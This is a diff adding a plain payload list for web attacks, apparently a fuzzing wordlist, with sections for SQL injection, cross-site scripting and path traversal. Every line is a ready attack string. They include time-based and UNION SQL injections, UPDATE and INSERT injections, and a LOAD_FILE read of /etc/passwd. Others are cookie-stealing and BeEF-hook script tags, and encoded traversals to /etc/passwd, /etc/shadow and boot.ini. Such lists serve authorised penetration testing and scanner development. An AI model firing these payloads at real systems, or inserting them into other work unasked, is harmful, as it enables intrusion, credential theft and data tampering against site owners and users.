@@ -1,0 +1,57 @@
+SQL Injection
+1 OR 1=1
+’ OR 1=1 --
+” OR 1=1 --’
+OR 1=1;
+1 AND 1=1
+x’ OR ’1’=’1
+‘ OR 1 in (@@version)--
+‘ UNION (select @@version) --
+1 OR sleep(___TIME___)#
+’ OR sleep(___TIME___)#
+” OR sleep(___TIME___)#
+1 or benchmark(10000000,MD5(1))#
+’ or benchmark(10000000,MD5(1))#
+” or benchmark(10000000,MD5(1))#
+;waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:__TIME__'--
+';waitfor delay '0:0:__TIME__'--
+";waitfor delay '0:0:__TIME__'--
+OR 1=1 ORDER BY table_name DESC
+x’; UPDATE table SET value WHERE user=’x
+1’; INSERT INTO table VALUES(‘value’,‘value’);--
+101 AND (SELECT ASCII(SUBSTR(name,1,1)) FROM table WHERE foo=n)$ --
+’ union select null,LOAD_FILE(’../../../../../etc/passwd’),null,null,null --
+
+
+Cross-Site Scripting
+”><script>alert(document.cookie)</script>
+aaaa”><script>alert(1)</script>
+<script>prompt(’1’)</script>
+‘><script>alert(document.cookie)</script>
+<script>alert(‘xss’);</script>
+<scr<script>ipt>alert(xss)</scr</script>ipt>
+<script><script>alert(1)</script>
+<script language=”javascript”>window.location.href = ”beeftrap.html” ; </script>
+<script src=”http://beefhook.js”></script>
+<ScRiPt>alert(1)</ScRiPt>
+%00<script>alert(1)</script>
+<img onerror=alert(1) src=a>
+
+Path Traversal
+etc/passwd
+/etc/passwd%00
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../boot/grub/grub.conf
+../../../../../var/log
+../../../../../etc/apache2/httpd.conf
+..\..\..\../c/boot.ini
+..\../..\../boot.ini
+../../../../../../etc/shadow&=%3C%3C%3C%3C%3C
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
+..%5c..%5c..%5c..%5c..%5c..%5cc/boot.ini
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
